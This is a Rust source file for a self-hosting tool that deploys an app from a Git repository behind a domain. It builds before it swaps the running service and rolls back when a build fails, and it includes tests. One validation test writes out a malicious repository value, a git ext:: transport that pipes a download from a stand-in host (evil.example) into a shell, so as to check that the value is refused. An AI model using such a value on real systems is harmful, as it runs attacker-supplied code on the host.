//! Deploying an application from a Git repository behind a domain.
//!
//! An *app-site* is two objects that must agree but stay separable:
//!
//! - a **backend** — a [`ServiceSpec`] the [`Supervisor`] runs and keeps running,
//!   built from a repository whose branch is watched for pushes; and
//! - a **route** — a [`Site`] the proxy turns into a health-checked upstream
//!   [`Pool`](selfhost_proxy) so a hostname forwards to `127.0.0.1:<port>`.
//!
//! This crate is the seam that composes one [`AppSpec`] into both, keeping them
//! consistent — the port the server binds is the port the proxy forwards to and
//! the port the health checker probes — and then carries out the deployment.
//!
//! # The one guarantee that is not in [`selfhost_git`]
//!
//! The watch-driven deployment in [`selfhost_git::deploy`] stops the service
//! *before* it fetches and builds, so a build that fails leaves the service
//! stopped: correct, but it takes the site offline to discover a broken commit.
//! An operator asking to deploy a new version should not risk the running one to
//! do it. So [`deploy`] reorders the work:
//!
//! 1. update the working copy to the branch tip;
//! 2. **run the build first, while the previous version keeps serving**;
//! 3. only if the build succeeds, swap the service onto the new tree (a short,
//!    honest restart);
//! 4. if the build fails, the service is never touched, and the working copy is
//!    rolled back to the commit the running version was built from, so a later
//!    restart still runs the good version.
//!
//! The cost of building in the live working copy — rather than stopping first —
//! is that the tree briefly holds new, not-yet-built code while the old process
//! is still running from what it loaded at start. That process is unaffected
//! until it restarts, and on a failed build it never does; the rollback restores
//! the tree before anything reads it again. This is the same "reset is our model"
//! tradeoff [`selfhost_git`] documents, taken in the other order so the failure
//! mode is downtime avoided rather than downtime risked.
//!
//! # How the port is wired
//!
//! A [`ServiceSpec`] names a program, not a port — the backend binds its own. So
//! the port is made the single source of truth by injecting it as `PORT` into the
//! backend's environment: the server is expected to bind `$PORT`, the proxy
//! forwards to that same number, and the two cannot drift because they are read
//! from one field. An explicit `PORT` in [`AppSpec::env`] is left as the operator
//! set it, so a backend that reads a differently named variable can still be told
//! the truth by hand.

#![forbid(unsafe_code)]
#![warn(missing_docs)]

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use selfhost_config::git::DEFAULT_INTERVAL_SECS;
use selfhost_config::{
    GitWatch, Health, Instance, Problem, RestartPolicy, ServiceSpec, Site, StartMode,
};
use selfhost_git::plan;
use selfhost_git::run::{self, BUILD_TIMEOUT, TRANSFER_TIMEOUT};
use selfhost_supervisor::Supervisor;

/// A request to deploy an application from a Git repository behind a domain.
///
/// The fields are public so a caller can adjust the defaults [`AppSpec::new`]
/// sets, but the two composed objects — the backend and the route — are only ever
/// built through [`AppSpec::service`] and [`AppSpec::site`], so the port injection
/// and the working-copy path are decided in one place.
#[derive(Debug, Clone)]
pub struct AppSpec {
    /// Identifier for the service, the route, and the checkout directory.
    ///
    /// Restricted by [`ServiceSpec`]'s own rules, because it becomes a log
    /// filename and a directory name.
    pub name: String,
    /// Every hostname that serves this application. The first is canonical.
    pub domains: Vec<String>,
    /// The repository to clone and pull from. Validated by [`GitWatch`].
    pub repository: String,
    /// The branch whose movement redeploys the application.
    pub branch: String,
    /// The command that starts the server, program first, already split.
    ///
    /// Split rather than a shell string for the reason [`ServiceSpec::args`]
    /// gives: word-splitting a single string differs by implementation and breaks
    /// silently on a path with a space.
    pub serve: Vec<String>,
    /// The build step run in the working copy before the server starts, if any.
    ///
    /// `npm ci`, `cargo build --release`, a migration. A non-zero exit abandons
    /// the deployment with the previous version still serving.
    pub build: Option<Vec<String>>,
    /// The node that runs the backend and answers the route. Must be a known node.
    pub node: String,
    /// The port the server binds and the proxy forwards to.
    pub port: u16,
    /// Seconds between checks of the remote branch, for the background watch.
    pub interval_secs: u64,
    /// Extra environment for the backend, on top of the injected `PORT`.
    pub env: BTreeMap<String, String>,
    /// How the route's instance is health-checked.
    pub health: Health,
    /// Redirect every non-canonical domain to the canonical one.
    pub canonical_redirect: bool,
    /// Where the working copy lives, relative to the daemon's base directory.
    ///
    /// `None` means `checkouts/<name>`, which is inside the data directory and so
    /// safe to hard-reset on every deployment.
    pub checkout: Option<PathBuf>,
}

impl AppSpec {
    /// An application with defaults, named and pointed at a repository, a node,
    /// and a port.
    pub fn new(
        name: impl Into<String>,
        domains: Vec<String>,
        repository: impl Into<String>,
        serve: Vec<String>,
        node: impl Into<String>,
        port: u16,
    ) -> Self {
        Self {
            name: name.into(),
            domains,
            repository: repository.into(),
            branch: selfhost_config::git::DEFAULT_BRANCH.to_owned(),
            serve,
            build: None,
            node: node.into(),
            port,
            interval_secs: DEFAULT_INTERVAL_SECS,
            env: BTreeMap::new(),
            health: Health::default(),
            canonical_redirect: true,
            checkout: None,
        }
    }

    /// The working copy's path, relative to the daemon's base directory.
    ///
    /// The default, `checkouts/<name>`, resolves the same way a service's `cwd`
    /// and a watch's `path` do, so the checkout, the service that runs from it,
    /// and the watch that updates it all name one directory.
    pub fn checkout_path(&self) -> PathBuf {
        self.checkout
            .clone()
            .unwrap_or_else(|| PathBuf::from("checkouts").join(&self.name))
    }

    /// The Git watch that keeps the working copy on the branch tip.
    ///
    /// Its `post_pull` is the build step, so the background poller in
    /// [`selfhost_git`] can also redeploy on a push — with that crate's
    /// stop-first guarantee. The stronger no-downtime-on-a-failed-build guarantee
    /// is [`deploy`]'s, for a deployment an operator asked for.
    pub fn watch(&self) -> GitWatch {
        let mut watch = GitWatch::new(self.repository.trim(), self.checkout_path());
        watch.branch = self.branch.clone();
        watch.interval_secs = self.interval_secs;
        watch.post_pull = self.build.clone();
        watch
    }

    /// The supervised backend: the serve command, with `PORT` injected and the
    /// working copy watched.
    ///
    /// The server runs from the working copy (`cwd`), so the code it executes and
    /// the code the watch updates are the same tree.
    pub fn service(&self) -> ServiceSpec {
        let (program, args) = match self.serve.split_first() {
            Some((program, rest)) => (PathBuf::from(program), rest.to_vec()),
            // An empty command is refused by `check`; an empty program here lets
            // that check name it rather than making this method fallible.
            None => (PathBuf::new(), Vec::new()),
        };

        let mut spec = ServiceSpec::new(&self.name, program);
        spec.args = args;
        spec.cwd = Some(self.checkout_path());
        spec.env = self.env.clone();
        // The port is the single source of truth for where the backend listens
        // and where the proxy forwards; injecting it here is what keeps the two
        // from drifting. An operator who set PORT themselves is left alone.
        spec.env.entry("PORT".to_owned()).or_insert_with(|| self.port.to_string());
        if !self.node.is_empty() {
            spec.node = Some(self.node.clone());
        }
        spec.start_mode = StartMode::Automatic;
        spec.restart = RestartPolicy::OnFailure;
        spec.git = Some(self.watch());
        spec
    }

    /// The route: every domain forwards to this application's single instance.
    ///
    /// No `static_root` and no `app_paths`, so every path is routed to the
    /// backend — the shape of a site that is an application, not files with an
    /// API bolted on.
    pub fn site(&self) -> Site {
        Site {
            name: self.name.clone(),
            domains: self.domains.clone(),
            static_root: None,
            spa: false,
            app_paths: Vec::new(),
            instances: vec![Instance { node: self.node.clone(), port: self.port }],
            health: self.health.clone(),
            canonical_redirect: self.canonical_redirect,
            allowed_cidrs: Vec::new(),
            console: false,
        }
    }

    /// Collects every structural problem with this application, reporting all at
    /// once so one attempt names everything that needs fixing.
    ///
    /// `known_nodes` comes from the deployment config; pass an empty slice to skip
    /// the node check. The backend's rules — a portable name, a valid repository
    /// and branch, usable environment names — are checked through
    /// [`ServiceSpec::check`] so this crate does not restate them.
    pub fn check(&self, known_nodes: &[&str]) -> Vec<Problem> {
        let mut problems = Vec::new();
        self.service().check("app", known_nodes, &mut problems);

        if self.serve.is_empty() {
            problems.push(Problem {
                field: "app.serve".into(),
                message: "name the command that starts the server, program first".into(),
            });
        }

        if self.domains.is_empty() {
            problems.push(Problem {
                field: "app.domains".into(),
                message: "declare at least one domain, or the application answers on no hostname"
                    .into(),
            });
        }

        if self.port == 0 {
            problems.push(Problem {
                field: "app.port".into(),
                message: "must be a fixed port the server binds; 0 asks the OS to choose one, \
                          which the proxy then cannot forward to"
                    .into(),
            });
        }

        if self.node.is_empty() {
            problems.push(Problem {
                field: "app.node".into(),
                message: "name the node that runs this application".into(),
            });
        } else if !known_nodes.is_empty() && !known_nodes.contains(&self.node.as_str()) {
            problems.push(Problem {
                field: "app.node".into(),
                message: format!("unknown node \"{}\"", self.node),
            });
        }

        problems
    }
}

/// How a deployment ended.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Deployment {
    /// The first deployment: cloned, built, installed, and started.
    Installed {
        /// The commit the working copy landed on.
        commit: String,
    },
    /// A redeployment: rebuilt from a new commit and swapped onto it.
    Updated {
        /// The commit now serving.
        commit: String,
    },
    /// The build failed, so the swap never happened.
    ///
    /// The working copy is rolled back to the previous commit. `previous_serving`
    /// says whether there was a running version to protect — `true` means it is
    /// still up.
    BuildFailed {
        /// Whether a previous version was serving throughout, and still is.
        previous_serving: bool,
        /// What the build said, fit to show an operator.
        reason: String,
    },
    /// A step before the build failed — the update could not reach the branch, or
    /// the checkout directory is occupied by something that is not a working copy.
    Failed {
        /// Which step, in an operator's words.
        step: &'static str,
        /// What went wrong.
        reason: String,
    },
}

impl Deployment {
    /// Whether a new version is now serving.
    pub fn succeeded(&self) -> bool {
        matches!(self, Self::Installed { .. } | Self::Updated { .. })
    }
}

/// Deploys an application, building before it disturbs the running version.
///
/// On success the backend is installed into `supervisor` and started, and the
/// caller is expected to persist [`AppSpec::service`] and [`AppSpec::site`] and
/// reload the proxy so the route goes live. On a failed build the running version
/// is left exactly as it was.
pub async fn deploy(supervisor: &Supervisor, spec: &AppSpec) -> Deployment {
    let base = supervisor.base_dir().to_path_buf();
    let checkout = base.join(spec.checkout_path());

    let previously_serving = supervisor
        .status(&spec.name)
        .await
        .is_some_and(|status| status.state.is_live());
    let fresh = !checkout.join(".git").is_dir();
    // Read where the running version was built from before the update moves the
    // tree, so a failed build can be rolled back to exactly it.
    let previous_commit = if fresh { None } else { head(&checkout, &base).await };

    if let Err((step, reason)) = update_working_copy(spec, &checkout, &base, fresh).await {
        return Deployment::Failed { step, reason };
    }

    let commit = head(&checkout, &base).await.unwrap_or_else(|| spec.branch.clone());

    build_and_activate(BuildAndActivate {
        supervisor,
        spec,
        checkout: &checkout,
        base: &base,
        fresh,
        previously_serving,
        previous_commit: previous_commit.as_deref(),
        commit,
    })
    .await
}

/// Everything [`build_and_activate`] needs, gathered so the deploy sequence and
/// the tests drive the same code with the git step already done.
struct BuildAndActivate<'a> {
    supervisor: &'a Supervisor,
    spec: &'a AppSpec,
    checkout: &'a Path,
    base: &'a Path,
    fresh: bool,
    previously_serving: bool,
    previous_commit: Option<&'a str>,
    commit: String,
}

/// Builds in the updated working copy and, only on success, swaps the service.
///
/// This is the heart of the guarantee, separated from the git update so it can be
/// exercised without a network: the supervisor is touched only after the build
/// succeeds, and never at all when it fails.
async fn build_and_activate(job: BuildAndActivate<'_>) -> Deployment {
    if let Some(command) = job.spec.build.as_deref() {
        match run::build_step(command, job.checkout, BUILD_TIMEOUT).await {
            Ok(ran) if ran.succeeded() => {}
            Ok(ran) => return build_failed(&job, ran.complaint()).await,
            Err(error) => return build_failed(&job, error.to_string()).await,
        }
    }

    // The build is good. Installing replaces any running version — stopping the
    // old process and starting the new one from the freshly built tree — which is
    // the one short window of downtime, on the success path only.
    job.supervisor.install(job.spec.service()).await;
    job.supervisor.start(&job.spec.name).await;

    if job.fresh {
        Deployment::Installed { commit: job.commit }
    } else {
        Deployment::Updated { commit: job.commit }
    }
}

/// Rolls the working copy back and reports the failure, without touching the
/// running service.
async fn build_failed(job: &BuildAndActivate<'_>, reason: String) -> Deployment {
    // Restore the tree the running version was built from, so a later restart
    // runs the good version rather than the broken one just fetched. Skipped on a
    // first deploy (nothing to roll back to) and when there is no repository.
    if let Some(commit) = job.previous_commit
        && job.checkout.join(".git").is_dir()
    {
        let _ = run::git(&reset_hard_args(job.checkout, commit), job.base, TRANSFER_TIMEOUT).await;
    }
    Deployment::BuildFailed { previous_serving: job.previously_serving, reason }
}

/// Brings the working copy onto the branch tip, cloning it if it is not there yet.
///
/// Mirrors [`selfhost_git::deploy`]'s update, reusing its argument builders: clone
/// on a first deployment, fetch then hard-reset on a later one. Returns the step
/// that failed and a reason fit to show an operator.
async fn update_working_copy(
    spec: &AppSpec,
    checkout: &Path,
    base: &Path,
    fresh: bool,
) -> Result<(), (&'static str, String)> {
    let watch = spec.watch();

    if !fresh {
        for args in [plan::fetch_args(&watch, checkout), plan::reset_args(checkout)] {
            run_git(&args, base, "update").await?;
        }
        return Ok(());
    }

    // A directory that exists but holds no repository is refused, not cloned over:
    // it is either the wrong path or a clone that failed halfway, and both want a
    // person. The same rule as [`selfhost_git::deploy`].
    if checkout.exists() {
        return Err((
            "update",
            format!(
                "{} exists but is not a git working copy; move it aside or point the app \
                 somewhere else",
                checkout.display()
            ),
        ));
    }
    if let Some(parent) = checkout.parent()
        && let Err(error) = tokio::fs::create_dir_all(parent).await
    {
        return Err(("update", format!("cannot create {}: {error}", parent.display())));
    }

    run_git(&plan::clone_args(&watch, checkout), base, "clone").await
}

/// Runs one `git` command, mapping both a non-zero exit and a failure to run into
/// the step's reported reason.
async fn run_git(args: &[String], base: &Path, step: &'static str) -> Result<(), (&'static str, String)> {
    match run::git(args, base, TRANSFER_TIMEOUT).await {
        Ok(ran) if ran.succeeded() => Ok(()),
        Ok(ran) => Err((step, ran.complaint())),
        Err(error) => Err((step, error.to_string())),
    }
}

/// Arguments for resetting a working copy to a specific commit.
///
/// Used only for the rollback after a failed build. A local reset touches no
/// remote, so the transport hardening the network commands carry is not needed
/// here; the commit is one [`plan::parse_head`] already accepted as an object
/// name, so it cannot be read as an option.
fn reset_hard_args(at: &Path, commit: &str) -> Vec<String> {
    vec![
        "-C".to_owned(),
        at.display().to_string(),
        "reset".to_owned(),
        "--hard".to_owned(),
        commit.to_owned(),
    ]
}

/// The commit a working copy is on, or `None` if it has none yet.
async fn head(checkout: &Path, base: &Path) -> Option<String> {
    if !checkout.join(".git").is_dir() {
        return None;
    }
    let ran = run::git(&plan::head_args(checkout), base, run::LS_REMOTE_TIMEOUT).await.ok()?;
    ran.succeeded().then(|| plan::parse_head(&ran.stdout)).flatten()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn app() -> AppSpec {
        AppSpec::new(
            "blog",
            vec!["blog.example.com".into(), "www.blog.example.com".into()],
            "https://github.com/owner/blog.git",
            vec!["node".into(), "server.js".into()],
            "home",
            5050,
        )
    }

    #[test]
    fn the_backend_runs_the_serve_command_from_the_working_copy() {
        let spec = app().service();
        assert_eq!(spec.program, PathBuf::from("node"));
        assert_eq!(spec.args, vec!["server.js".to_owned()]);
        assert_eq!(spec.cwd, Some(PathBuf::from("checkouts/blog")));
    }

    #[test]
    fn the_port_is_injected_so_the_backend_and_the_route_cannot_drift() {
        let spec = app();
        assert_eq!(spec.service().env.get("PORT").map(String::as_str), Some("5050"));
        assert_eq!(spec.site().instances[0].port, 5050);
    }

    #[test]
    fn an_operators_own_port_variable_is_left_as_they_set_it() {
        let mut spec = app();
        spec.env.insert("PORT".into(), "9999".into());
        assert_eq!(spec.service().env.get("PORT").map(String::as_str), Some("9999"));
    }

    #[test]
    fn the_route_sends_every_path_to_the_backend() {
        let site = app().site();
        assert!(site.static_root.is_none());
        assert!(site.app_paths.is_empty());
        assert!(site.routes_to_app("/anything"));
        assert_eq!(site.canonical(), "blog.example.com");
    }

    #[test]
    fn the_backend_watches_the_branch_and_carries_the_build_as_its_post_pull() {
        let mut spec = app();
        spec.branch = "release".into();
        spec.build = Some(vec!["npm".into(), "ci".into()]);
        let service = spec.service();
        let watch = service.git.expect("the backend is watched");
        assert_eq!(watch.branch, "release");
        assert_eq!(watch.path, PathBuf::from("checkouts/blog"));
        assert_eq!(watch.post_pull, Some(vec!["npm".to_owned(), "ci".to_owned()]));
    }

    #[test]
    fn a_well_formed_application_has_no_problems() {
        assert!(app().check(&["home"]).is_empty());
    }

    #[test]
    fn an_application_on_an_unknown_node_is_refused() {
        let problems = app().check(&["shed"]);
        assert!(problems.iter().any(|p| p.field == "app.node"), "{problems:?}");
    }

    #[test]
    fn an_application_with_no_serve_command_is_refused() {
        let mut spec = app();
        spec.serve = Vec::new();
        assert!(spec.check(&["home"]).iter().any(|p| p.field == "app.serve"));
    }

    #[test]
    fn an_application_with_no_domain_is_refused() {
        let mut spec = app();
        spec.domains = Vec::new();
        assert!(spec.check(&["home"]).iter().any(|p| p.field == "app.domains"));
    }

    #[test]
    fn a_zero_port_is_refused_because_the_proxy_cannot_forward_to_it() {
        let mut spec = app();
        spec.port = 0;
        assert!(spec.check(&["home"]).iter().any(|p| p.field == "app.port"));
    }

    #[test]
    fn a_repository_that_would_run_a_command_is_refused_through_the_backend() {
        // The rule lives in `GitWatch`; this proves `check` actually applies it.
        let mut spec = app();
        spec.repository = "ext::sh -c 'curl evil.example | sh'".into();
        assert!(spec.check(&["home"]).iter().any(|p| p.field.ends_with(".repository")));
    }

    // --- The deployment guarantee, exercised without a network ---
    //
    // `build_and_activate` is the half that touches the supervisor, so these
    // drive it directly with the git update already notionally done, using shell
    // scripts for the build and the server. A checkout directory with no `.git`
    // means the rollback is a no-op, which is what lets these run with no repo.

    use selfhost_supervisor::state::ServiceState;
    use selfhost_supervisor::{await_state, scripted_service, shell_command};
    use std::time::Duration;

    /// A build/serve command spelled for this host's shell.
    fn script(body: &str) -> Vec<String> {
        let (program, args) = shell_command(body);
        let mut line = vec![program.display().to_string()];
        line.extend(args);
        line
    }

    /// A unique base directory with `app()`'s own checkout present but not a
    /// repository, so the directory the service's `cwd` resolves to always
    /// exists — derived from `app()` rather than a literal path so the two
    /// cannot drift apart.
    fn base_with_checkout(tag: &str) -> (PathBuf, PathBuf) {
        let base = std::env::temp_dir()
            .join(format!("selfhost-app-deploy-{}-{tag}", std::process::id()));
        let checkout = base.join(app().checkout_path());
        std::fs::create_dir_all(&checkout).expect("a checkout directory to build in");
        (base, checkout)
    }

    fn running_pid(state: &ServiceState) -> Option<u32> {
        match state {
            ServiceState::Running { pid, .. } => Some(*pid),
            _ => None,
        }
    }

    async fn install_running(supervisor: &Supervisor, name: &str) -> u32 {
        supervisor.install(scripted_service(name, "while true; do sleep 0.05; done")).await;
        let state = await_state(supervisor, name, Duration::from_secs(5), |s| s.is_live())
            .await
            .expect("the previous version starts");
        running_pid(&state).expect("a live pid")
    }

    #[tokio::test]
    async fn a_failed_build_leaves_the_previous_version_serving_untouched() {
        let (base, checkout) = base_with_checkout("fail-keeps-serving");
        let supervisor = Supervisor::new(&base);
        let spec_name = app().name;
        let before = install_running(&supervisor, &spec_name).await;

        let mut spec = app();
        spec.serve = script("while true; do sleep 0.05; done");
        spec.build = Some(script("exit 1"));

        let outcome = build_and_activate(BuildAndActivate {
            supervisor: &supervisor,
            spec: &spec,
            checkout: &checkout,
            base: &base,
            fresh: false,
            previously_serving: true,
            previous_commit: None,
            commit: "deadbee".into(),
        })
        .await;

        assert!(matches!(outcome, Deployment::BuildFailed { previous_serving: true, .. }));
        // The running version must be the very same process — never stopped,
        // never restarted — which is the whole point of building first.
        let after = supervisor.status(&spec_name).await.expect("still installed");
        assert_eq!(running_pid(&after.state), Some(before), "the previous process was disturbed");

        supervisor.shutdown().await;
        let _ = std::fs::remove_dir_all(&base);
    }

    #[tokio::test]
    async fn a_successful_build_swaps_the_service_onto_the_new_version() {
        let (base, checkout) = base_with_checkout("success-swaps");
        let supervisor = Supervisor::new(&base);
        let spec_name = app().name;
        install_running(&supervisor, &spec_name).await;

        let mut spec = app();
        spec.serve = script("while true; do sleep 0.05; done");
        spec.build = Some(script("exit 0"));

        let outcome = build_and_activate(BuildAndActivate {
            supervisor: &supervisor,
            spec: &spec,
            checkout: &checkout,
            base: &base,
            fresh: false,
            previously_serving: true,
            previous_commit: None,
            commit: "abc1234".into(),
        })
        .await;

        assert_eq!(outcome, Deployment::Updated { commit: "abc1234".into() });
        let state = await_state(&supervisor, &spec_name, Duration::from_secs(5), |s| s.is_live())
            .await
            .expect("the new version is serving");
        assert!(running_pid(&state).is_some());

        supervisor.shutdown().await;
        let _ = std::fs::remove_dir_all(&base);
    }

    #[tokio::test]
    async fn a_first_deploy_whose_build_fails_installs_nothing() {
        let (base, checkout) = base_with_checkout("first-deploy-fails");
        let supervisor = Supervisor::new(&base);

        let mut spec = app();
        spec.serve = script("while true; do sleep 0.05; done");
        spec.build = Some(script("exit 1"));

        let outcome = build_and_activate(BuildAndActivate {
            supervisor: &supervisor,
            spec: &spec,
            checkout: &checkout,
            base: &base,
            fresh: true,
            previously_serving: false,
            previous_commit: None,
            commit: "unbuilt".into(),
        })
        .await;

        assert!(matches!(outcome, Deployment::BuildFailed { previous_serving: false, .. }));
        assert!(supervisor.status(&spec.name).await.is_none(), "nothing was installed");

        supervisor.shutdown().await;
        let _ = std::fs::remove_dir_all(&base);
    }

    #[tokio::test]
    async fn a_no_build_application_installs_and_starts_the_backend() {
        // With no build step there is nothing to fail, so activation goes straight
        // to the swap.
        let (base, checkout) = base_with_checkout("no-build");
        let supervisor = Supervisor::new(&base);

        let mut spec = app();
        spec.serve = script("while true; do sleep 0.05; done");
        spec.build = None;

        let outcome = build_and_activate(BuildAndActivate {
            supervisor: &supervisor,
            spec: &spec,
            checkout: &checkout,
            base: &base,
            fresh: true,
            previously_serving: false,
            previous_commit: None,
            commit: "seed".into(),
        })
        .await;

        assert_eq!(outcome, Deployment::Installed { commit: "seed".into() });
        assert!(
            await_state(&supervisor, &spec.name, Duration::from_secs(5), |s| s.is_live())
                .await
                .is_some()
        );

        supervisor.shutdown().await;
        let _ = std::fs::remove_dir_all(&base);
    }
}
